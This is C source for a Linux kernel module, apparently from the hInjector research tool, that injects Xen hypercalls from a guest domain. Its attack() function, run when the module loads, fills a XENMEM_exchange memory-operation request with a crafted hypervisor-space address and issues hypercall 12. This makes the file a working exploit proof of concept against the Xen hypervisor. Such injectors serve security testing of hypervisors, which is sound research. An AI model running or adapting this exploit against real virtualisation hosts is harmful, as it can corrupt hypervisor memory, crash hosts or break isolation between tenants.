#undef __KERNEL__
#define __KERNEL__
 
#undef MODULE
#define MODULE
 
/* Linux header files */
#include <linux/module.h>    
#include <linux/kernel.h>    
#include <linux/init.h>        
#include <linux/delay.h>      
#include <linux/time.h>      

/* Xen header files */
#include <linux/slab.h>
#include <asm/xen/page.h>
#include <asm/xen/hypervisor.h>
#include <asm/xen/hypercall.h>
#include <xen/interface/memory.h>

/* Netlink header files */
#include <net/sock.h>
#include <linux/netlink.h>
#include <linux/skbuff.h>

MODULE_LICENSE("GPL");

#define FILL_STRUCTARGS0(arg0) \
        struct arg0 ob; \
        hinjStructAddr = (unsigned long int)&ob;

#define FILL_STRUCTARGS1(arg0, arg1, arg2) \
        FILL_STRUCTARGS0(arg0) \
        ob.arg1 = arg2;

#define FILL_STRUCTARGS2(arg0, arg1, arg2, arg3, arg4) \
        FILL_STRUCTARGS1(arg0, arg1, arg2) \
        ob.arg3 = arg4;

#define FILL_STRUCTARGS3(arg0, arg1, arg2, arg3, arg4, arg5, arg6) \
        FILL_STRUCTARGS2(arg0, arg1, arg2, arg3, arg4) \
        ob.arg5 = arg6;

#define FILL_STRUCTARGS4(arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8) \
        FILL_STRUCTARGS3(arg0, arg1, arg2, arg3, arg4, arg5, arg6) \
        ob.arg7 = arg8; 

#define FILL_STRUCTARGS5(arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10) \
        FILL_STRUCTARGS4(arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8) \
        ob.arg9 = arg10;

#define FILL_STRUCTARGS6(arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12) \
        FILL_STRUCTARGS5(arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10) \
        ob.arg11 = arg12;

#define FILL_STRUCTARGS7(arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12, arg13, arg14) \
        FILL_STRUCTARGS6(arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12) \
        ob.arg13 = arg14;

#define FILL_STRUCTARGS8(arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12, arg13, arg14, arg15, arg16) \
        FILL_STRUCTARGS7(arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12, arg13, arg14) \
        ob.arg15 = arg16;

#define FILL_STRUCTARGS9(arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12, arg13, arg14, arg15, arg16, arg17, arg18) \
        FILL_STRUCTARGS8(arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12, arg13, arg14, arg15, arg16) \
        ob.arg17 = arg18;

/* Hypercall invocation */
#define __MHYPERCALL_ENTRY(x)                                            \
        [offset] "i" ( x * sizeof(hypercall_page[0]))

#define __MYUL unsigned long

/* Invoking hypercalls with different numbers of parameters (1--5) */
#define __MHYPERCALL1ARGS_IF(x) \
        if(hinjHypNum == x){ \
          gen_hypercall1arg(x, hinjParams[0]); \
          printk(KERN_INFO "Invoked hypercall with no.: " #x"\n");} \
        else (void)0;

#define __MHYPERCALL2ARGS_IF(x) \
        if(hinjHypNum == x){ \
          gen_hypercall2arg(x, hinjParams[0], hinjParams[1]); \
          printk(KERN_INFO "Invoked hypercall with no.: " #x"\n");} \
        else (void)0;

#define __MHYPERCALL3ARGS_IF(x) \
        if(hinjHypNum == x){ \
          gen_hypercall3arg(x, hinjParams[0], hinjParams[1], hinjParams[2]); \
          printk(KERN_INFO "Invoked hypercall with no.: " #x"\n");} \
        else (void)0;

#define __MHYPERCALL4ARGS_IF(x) \
        if(hinjHypNum == x){ \
          gen_hypercall4arg(x, hinjParams[0], hinjParams[1], hinjParams[2], hinjParams[3]); \
          printk(KERN_INFO "Invoked hypercall with no.: " #x"\n");} \
        else (void)0;

#define __MHYPERCALL5ARGS_IF(x) \
        if(hinjHypNum == x){ \
          gen_hypercall5arg(x, hinjParams[0], hinjParams[1], hinjParams[2], hinjParams[3], hinjParams[4]); \
          printk(KERN_INFO "Invoked hypercall with no.: " #x"\n");} \
        else (void)0;


/* 
* timersub helps the conversion of system time (format s:msec) to hInjector internal time 
*   --- taken from the BSD kernel.
*/
static inline unsigned long
gen_hypercall1arg(unsigned long number, unsigned long param1) {
register unsigned long __mres  asm(__HYPERCALL_RETREG);
register unsigned long __marg1 asm(__HYPERCALL_ARG1REG) = param1;
asm volatile (__HYPERCALL
     : "=r" (__mres), "+r" (__marg1)
     : __MHYPERCALL_ENTRY(number)
     : __HYPERCALL_CLOBBER1
     );
return (__MYUL)__mres;
}

static inline unsigned long
gen_hypercall2arg(unsigned long number, unsigned long param1, unsigned long param2) {
register unsigned long __mres  asm(__HYPERCALL_RETREG);
register unsigned long __marg1 asm(__HYPERCALL_ARG1REG) = param1;
register unsigned long __marg2 asm(__HYPERCALL_ARG2REG) = param2;
asm volatile (__HYPERCALL
     : "=r" (__mres), "+r" (__marg1), "+r" (__marg2)
     : __MHYPERCALL_ENTRY(number)
     : __HYPERCALL_CLOBBER2
     );
return (__MYUL)__mres;
}

static inline unsigned long
gen_hypercall3arg(unsigned long number, unsigned long param1, unsigned long param2, unsigned long param3) {
register unsigned long __mres  asm(__HYPERCALL_RETREG);
register unsigned long __marg1 asm(__HYPERCALL_ARG1REG) = param1;
register unsigned long __marg2 asm(__HYPERCALL_ARG2REG) = param2;
register unsigned long __marg3 asm(__HYPERCALL_ARG3REG) = param3;
asm volatile (__HYPERCALL
     : "=r" (__mres), "+r" (__marg1), "+r" (__marg2), "+r" (__marg3)
     : __MHYPERCALL_ENTRY(number)
     : __HYPERCALL_CLOBBER3
     );
return (__MYUL)__mres;
}

static inline unsigned long
gen_hypercall4arg(unsigned long number, unsigned long param1, unsigned long param2, unsigned long param3, unsigned long param4) {
register unsigned long __mres  asm(__HYPERCALL_RETREG);
register unsigned long __marg1 asm(__HYPERCALL_ARG1REG) = param1;
register unsigned long __marg2 asm(__HYPERCALL_ARG2REG) = param2;
register unsigned long __marg3 asm(__HYPERCALL_ARG3REG) = param3;
register unsigned long __marg4 asm(__HYPERCALL_ARG4REG) = param4;
asm volatile (__HYPERCALL
     : "=r" (__mres), "+r" (__marg1), "+r" (__marg2), "+r" (__marg3), "+r" (__marg4)
     : __MHYPERCALL_ENTRY(number)
     : __HYPERCALL_CLOBBER4
     );
return (__MYUL)__mres;
}

static inline unsigned long
gen_hypercall5arg(unsigned long number, unsigned long param1, unsigned long param2, unsigned long param3, unsigned long param4, unsigned long param5) {
register unsigned long __mres  asm(__HYPERCALL_RETREG);
register unsigned long __marg1 asm(__HYPERCALL_ARG1REG) = param1;
register unsigned long __marg2 asm(__HYPERCALL_ARG2REG) = param2;
register unsigned long __marg3 asm(__HYPERCALL_ARG3REG) = param3;
register unsigned long __marg4 asm(__HYPERCALL_ARG4REG) = param4;
register unsigned long __marg5 asm(__HYPERCALL_ARG5REG) = param5;
asm volatile (__HYPERCALL
     : "=r" (__mres), "+r" (__marg1), "+r" (__marg2), "+r" (__marg3), "+r" (__marg4), "+r" (__marg5)
     : __MHYPERCALL_ENTRY(number)
     : __HYPERCALL_CLOBBER5
     );
return (__MYUL)__mres;
}
int hinjHypNum = 1;
unsigned long int hinjStructAddr;
void attack(void){
unsigned long hinjValue[9] = {16,1,1,1,16,1,18446603885977010000,DOMID_SELF,0};//18446744071609552026,18446603885977010000
FILL_STRUCTARGS9(xen_memory_exchange, in.nr_extents, hinjValue[0], in.extent_order, hinjValue[1], in.extent_start, hinjValue[2], in.domid, hinjValue[3], out.nr_extents, hinjValue[4], out.extent_order, hinjValue[5], out.extent_start, hinjValue[6], out.domid, hinjValue[7],nr_exchanged,hinjValue[8]);
unsigned long hinjParams[2] = {11,hinjStructAddr};
int hinjHypNum = 12;
__MHYPERCALL2ARGS_IF(12);
};
static int __init hello_init(void)
{

    attack();
    return 0;
}


/* The __exit function. */
static void __exit hello_cleanup(void)
{
printk(KERN_INFO "hInjector LKM terminated.\n");
}

module_init(hello_init);
module_exit(hello_cleanup);

